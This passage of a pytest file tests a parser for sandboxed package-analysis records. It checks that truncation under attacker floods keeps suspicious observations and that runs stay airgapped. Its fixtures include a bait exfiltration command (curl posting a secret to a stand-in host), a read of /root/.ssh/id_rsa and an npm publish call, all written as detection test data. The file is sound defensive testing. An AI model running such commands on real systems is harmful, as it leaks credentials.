    sockets = [{"Address": "192.0.2.1", "Port": 443, "Hostnames": ["x.test"]}]
    raw = record(
        {
            "install": summary(Commands=commands, Files=files, DNS=dns, Sockets=sockets),
            "import": summary(Files=files),
        }
    )
    result = parse(raw)
    run = result.run
    assert run.truncated is True
    assert run.cuts == {"observations": 1002 + 4 - 12}
    kinds = [(o.phase, o.kind) for o in result.observations]
    assert kinds.count(("install", K.EXEC)) == 8  # 12 minus one each for the other groups
    for group in [("install", K.OPEN), ("install", K.CONNECT), ("install", K.DNS)]:
        assert group in kinds
    assert ("import", K.OPEN) in kinds
    execs = [o.argv for o in result.observations if o.kind is K.EXEC]
    assert execs[0] == tuple(INSTALL_DRIVER)  # kept as high-value, and in file order
    assert execs[-1] == ("curl", "-d", SECRET_MARK, "https://x.test")
    assert run.canaries  # the driver's baits are read before the cut
    assert run.observation_count == 12
    (exec_group, *_) = run.groups
    assert exec_group == GroupCount(
        phase="install", kind=K.EXEC, recorded=1002, kept=8, priority=2, priority_kept=2
    )


def test_a_two_ended_flood_cannot_evict_the_middle(monkeypatch: pytest.MonkeyPatch) -> None:
    """Round-4 review: package-analysis sorts commands and files, so floods sorting before
    and after the real entries (`!...` and `~...`) evicted everything between under a
    head-and-tail cut: `npm publish`, the bait exfiltration, the `id_rsa` read. High-value
    entries are kept first now, and the rest is a keyed sample, not the ends."""
    monkeypatch.setattr(ossf, "MAX_OBSERVATIONS", 60)
    low = [{"Command": [f"!{i:06d}"], "Environment": []} for i in range(500)]
    high = [{"Command": [f"~{i:06d}"], "Environment": []} for i in range(500)]
    real = [
        driver(),
        {"Command": ["curl", "-d", BAIT_SECRET, "https://x.test"], "Environment": None},
        {"Command": ["sh", "-c", "npm publish"], "Environment": None},
    ]
    files = [
        *[
            {"Path": f"/a{i:05d}", "Read": True, "Write": False, "Delete": False}
            for i in range(500)
        ],
        {"Path": "/root/.ssh/id_rsa", "Read": True, "Write": False, "Delete": False},
        *[
            {"Path": f"/z{i:05d}", "Read": True, "Write": False, "Delete": False}
            for i in range(500)
        ],
    ]
    result = parse(with_install(Commands=[*low, *real, *high], Files=files))
    argv = [o.argv for o in result.observations]
    assert ("curl", "-d", SECRET_MARK, "https://x.test") in argv
    assert ("sh", "-c", "npm publish") in argv
    assert "/root/.ssh/id_rsa" in [o.path for o in result.observations]
    assert result.run.cuts == {"observations": 1003 + 1001 - 60}
    assert [(g.recorded, g.kept, g.priority, g.priority_kept) for g in result.run.groups] == [
        (1003, 3 + 28, 3, 3),  # tier 0 whole, then a fair share of what it left
        (1001, 1 + 28, 1, 1),
    ]
    # The rest of each quota is a sample keyed by the file's own sha256: not the ends, and
    # the same on every parse of the same bytes.
    kept = [a[0] for a in argv if a and a[0][0] in "!~"]
    assert kept[:13] != [f"!{i:06d}" for i in range(13)]
    assert parse(with_install(Commands=[*low, *real, *high], Files=files)) == result


def test_a_flood_of_high_value_entries_is_sampled_not_steered(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A flood that passes the same test as the real entry competes with it by chance (the
    keyed sample), never by sort order, and its size is on the run for the rules."""
    monkeypatch.setattr(ossf, "MAX_OBSERVATIONS", 20)
    flood = [{"Command": ["sh", "-c", f"echo publish {i}"], "Environment": []} for i in range(200)]
    result = parse(with_install(Commands=flood))
    (group,) = result.run.groups
    assert (group.recorded, group.kept, group.priority, group.priority_kept) == (200, 20, 200, 20)
    kept = [int(o.argv[2].rpartition(" ")[2]) for o in result.observations]
    assert kept == sorted(kept) and kept != [*range(10), *range(190, 200)]


def test_a_run_is_always_airgapped() -> None:
    run = parse(FIXTURE.encode()).run
    with pytest.raises(ValueError, match="network"):
        type(run).model_validate(run.model_dump() | {"network": "online"})
